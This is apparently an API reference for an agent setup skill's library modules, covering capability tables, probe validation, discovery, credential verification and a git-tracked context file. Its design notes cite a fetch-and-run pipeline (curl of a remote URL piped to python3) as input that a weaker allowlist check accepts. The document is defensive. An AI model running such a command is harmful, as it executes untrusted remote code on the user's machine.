# rca-setup — API reference

Load this file **before** calling any `lib/` helper from the setup flow. It exists so an agent never
has to `grep`/`Read` the `lib/` source to re-derive a signature — a real, measured cost: on one run,
re-deriving signatures from source accounted for 92 of 407 tool calls.

`tests/wiring.test.mjs` enforces that every non-internal export of every module this skill owns
appears here. Adding a `lib/` module without documenting its exports here fails the suite.

**Contents:**

- [Capability table](#capability-table) — `lib/capability-table.mjs` (U1)
- [Discovery](#discovery) — `lib/discovery.mjs` (U2)
- [Verification](#verification) — `lib/verify.mjs` (U3)
- [Context artifact](#context-artifact) — `lib/rca-context.mjs` (U4)

---

## Capability table

`lib/capability-table.mjs` — pure. The caller supplies the parsed config
(`loadConfig` in `lib/routing.mjs` is the single file reader) and an optional overlay.

```
loadCapabilityTable(config, overlay=null) → {table, violations}
    merge the overlay over the shipped table, then validate the RESULT.
    An empty `violations` array is the only success signal.
validateTable(config, table)              → violations[]   every violation, not just the first
mergeOverlay(shipped, overlay)            → {table, violations}   never mutates `shipped`
capabilitiesFromRouting(config)           → string[]   skips entries with no `capability` key
RESOLVABLE                                Set: always | partial | always-asked
OVERLAY_FORBIDDEN                         fields an overlay may never set
```

Violation shape: `{code, capability?, field?, message}`. Codes:
`unseeded-capability` · `orphan-row` · `bad-resolvable` · `mandatory-count` ·
`missing-fingerprint` · `missing-probe` · `bad-probe` · `bad-mcp-probe` ·
`bad-fingerprint` · `missing-consumer` · `overlay-forbidden-field` · `overlay-malformed-row`

**Why the overlay cannot carry a probe.** `OVERLAY_FORBIDDEN` is
`fingerprints`, `probe`, `mcpProbe`, `scopeProbe`. A probe's legal leader is drawn from
its own row's declared fingerprint executables, so an overlay able to set both would
authorise its own probe leader — the restriction would certify itself. The shipped table
stays the sole source of leader allowlists.

**Probe validation lives in `lib/tool-cache.mjs`, and is not `isRunnable`.**
`isProbeRunnable(command, {leaders})` and `isPermittedProbeLeader(name)` are the gate.
`isRunnable` is the wrong tool in both directions — it accepts
`curl https://host/x | python3` (its filter allowlist includes `python3`, `awk`, `sed`)
and refuses `docker ps`, `aws ecs list-clusters`, `nomad status` and `pm2 ls`. Probe rules:
one command, no pipeline, no operators, no redirects, no mutation, and a leader present in
both the global catalog and the row's own fingerprints. Placeholders are brace-form
`{field}` — an unquoted `<` reads as a file redirect and is rejected.

Pass the raw template at schema time, and pass the **interpolated** string again immediately
before execution: a resolved scope value can carry a redirect- or flag-shaped token the
template never had.

## Discovery

`lib/discovery.mjs` — pure. The environment is passed in, never sensed: no `child_process`,
no `fs`, no `Date.now()`. That is what makes the engine replayable from a fixture.

```
discover({table, env, connectorSkills}) → {discovered, questions, custom, violations}
    env: {executables[], mcpServers[], repoFiles[]}   collected by the caller
    discovered[]: {capability, via, evidence, resolvedScope, unresolvedFields, tag}
                  — exactly the array buildManifest() consumes
    questions[]:  {capability, field, consumer, mandatory}   scope the interview still owes
    custom[]:     present tools no row fingerprints (R8) — routed into the declared-gap list

preFillFromConnectorSkills(table, connectorSkills) → {scopeByCapability, violations}
interpolate(template, scope, {leaders})            → {ok, command, argv} | {ok:false, reason}
```

**There is no probe executor here.** Discovery is fingerprint MATCHING; nothing is run.
Live reads belong to verification, so the probe-result replay seam lives there. This
module's fixtures (`tests/fixtures/discovery/*.json`) are environment descriptors.

**`interpolate` re-validates.** The template was checked at schema time against `{repo}`,
not against the string that runs. A resolved scope value can carry a redirect, an operator,
or a metacharacter the template never had, so the interpolated command goes through
`isProbeRunnable` again immediately before execution. Checking only the template is the gap
this closes.

**An always-asked capability is never resolved by discovery**, even on a coincidental
fingerprint hit — `other` is the catch-all, and matching it by accident would swallow the
unrecognised stack it exists to surface.

**Connector-skill pre-fill is a less-trusted input, not a more-trusted one.** It reads four
filesystem paths including a home directory, so any scope probe it declares passes the same
gate as a shipped table probe, and it may only fill scope fields the table already declares.

## Verification

`lib/verify.mjs` — pure. Probes are dispatched through an injected `runProbe`, because only
the agent can invoke an MCP tool: verify never calls one, it receives the result through the
same shape a CLI probe returns.

```
verifyGithub({row, scope, env, runProbe, prList, candidates, envVar})
    → {verified, blocking, via, targets[], accessLevel, warnings[], message?, nextAction?}
    GitHub is BINARY. `gh` or a GitHub MCP server, or blocking:true and setup stops.

verifyCapability({capability, row, targets, scope, runProbe, envVar, env, candidates})
    → {capability, verified, via, targets[], accessLevel, warnings[]}
    Per-TARGET: valid for one repo and 404 on another keeps the capability usable.

looksLikeSecret(value)            → {secret, kind?, rotationGuidance?}   never echoes the value
scrubFailure(raw)                 → error class; the raw text is DROPPED, not redacted-and-kept
nearMatch(value, candidates)      → closest candidate, or null rather than a wrong guess
classifyGap({errorClass, env, row}) → one of GAP_CLASS
prWindowWarning({mergedCount, windowDays, branch}) → warning | null
replayProbe(results)              → runProbe seam, keyed by command or `mcp:<tool>`
PR_WINDOW_DAYS                    30 — fixed, build-independent
ACCESS_LEVEL                      REPORTED | NOT_REPORTABLE
GAP_CLASS                         ABSENT_ON_MACHINE | SCOPE_INVALID | CREDENTIAL_UNDER_SCOPED
```

**`redact` is not the secret detector, and this matters.** Its patterns need a key prefix
(`token=`) or an auth scheme (`Bearer `), and it returns redacted *text* rather than a verdict —
so a bare pasted PAT comes back byte-identical and any check built on `redact(v) !== v` reports
"clean" for exactly the input that matters most. `looksLikeSecret` covers bare provider shapes
plus a high-entropy fallback that deliberately does **not** flag a 40-character lowercase-hex
git SHA. Use `redact` for reducing provider output; use `looksLikeSecret` for a verdict.

**Three gap classes, because the three need opposite responses.** A missing tool wants a local
install instruction; invalid team scope wants a targeted re-ask; a present-but-under-scoped
credential wants neither — re-asking team scope invites one person to rewrite it to fit their
own credential, and an install instruction names a tool they already have.

**`NOT_REPORTABLE` is a real access-level state**, not a fallback. `gh` via keyring or device
flow returns no scope header at all, and calling that "narrow" or "broad" would both be
inventions.

**On the MCP route the caller supplies `prList`.** There is no command string for a
branch PR list over MCP, so the agent runs it and passes the merged count — it is the
base-branch evidence on that route, not an optional extra.

## Context artifact

`lib/rca-context.mjs` — the only module here that touches the filesystem and git.
Uses `execFileSync("git", [...])` with an argument array, never a shell string.

```
readRcaContext({from, pluginRoot, path})   → {ok, context, path, complete} | {ok:false, code, message}
    codes: no-context · parse-error · schema-version · missing-field · unreadable
writeRcaContext({context, verifiedRepos, from, pluginRoot}) → {ok, path} | {ok:false, code, message}
    codes: missing-field · schema-version · secret-in-field · home-repo-unverified ·
           no-git-worktree · ignored-destination
findContextFile({from, pluginRoot})        → path | null
contextHomeDir({homeRepo, verifiedRepos, from, pluginRoot}) → {ok, dir} | {ok:false, code, message}
findSecretFields(context)                  → [{path, kind}]
resolveIntake({buildMeta, invocationArgs, context, connectorDefaults, fields})
                                           → {field: {value, source}}
CONTEXT_FILENAME  ".rca-context.json"      SCHEMA_VERSION      CREDENTIAL_KIND
```

**Not hardened, on purpose.** Every other persisted artifact in `lib/` writes 0600 files into
0700 directories. This one is git-tracked, where that mode is both wrong and not preserved by
git — so `hardenStateDir` must never be pointed at it. `tests/rca-context.test.mjs` asserts the
absence of any hardening call, because here the guard IS the absence.

**Fails loud on drift.** Unparseable, wrong-version and missing-field are three distinct named
errors, matching `csv-state.readRows`, which throws on a foreign header rather than dropping
columns. A hand-resolved merge conflict must never degrade to "no context" — that triggers a
full re-interview and reads to the customer as the feature forgetting them.

**Read resolution is two-stage**: each level from cwd upward, plus that level's immediate
children. The children half is what makes a sibling clone layout work — a context committed to
the product repo is invisible from the automation repo under a parent-only walk, and the
no-context refusal would then fire on a fully set-up machine. A candidate is accepted only when
its declared `homeRepo` matches the directory it was found in; the plugin's own root is always
refused, because the documented install flow makes cwd the plugin directory on a first run.

**Write resolution is separate from read resolution** and targets the declared home repo's
`git rev-parse --show-toplevel`. Read-side resolution cannot prevent a bad write: without this,
a first run would land the file where no teammate inherits it.

**The write-time secret guard covers every field**, including the credential-reference field —
that is exactly where a pasted secret most plausibly lands, so exempting it would leave the
likeliest leak unguarded. It uses `looksLikeSecret` from `lib/verify.mjs`, not `redact`, and
names the field path without ever echoing the value.

**Paths are canonicalized.** `git rev-parse` reports realpaths while a directory walk reports
what it was handed, so on macOS (`/var` → `/private/var`) the read and write sides would
otherwise return two spellings of one location.

This module is owned by **both** skills: the setup flow writes the context, and `rca-build`'s gate
reads it. The guard therefore requires its exports documented in this file **and** in
`skills/rca-build/SKILL.md`'s mandated reading. Documenting it in only one is a failure — an
at-least-one rule would let the adapter's agent grep `lib/` at runtime, which is the cost this guard
exists to prevent.
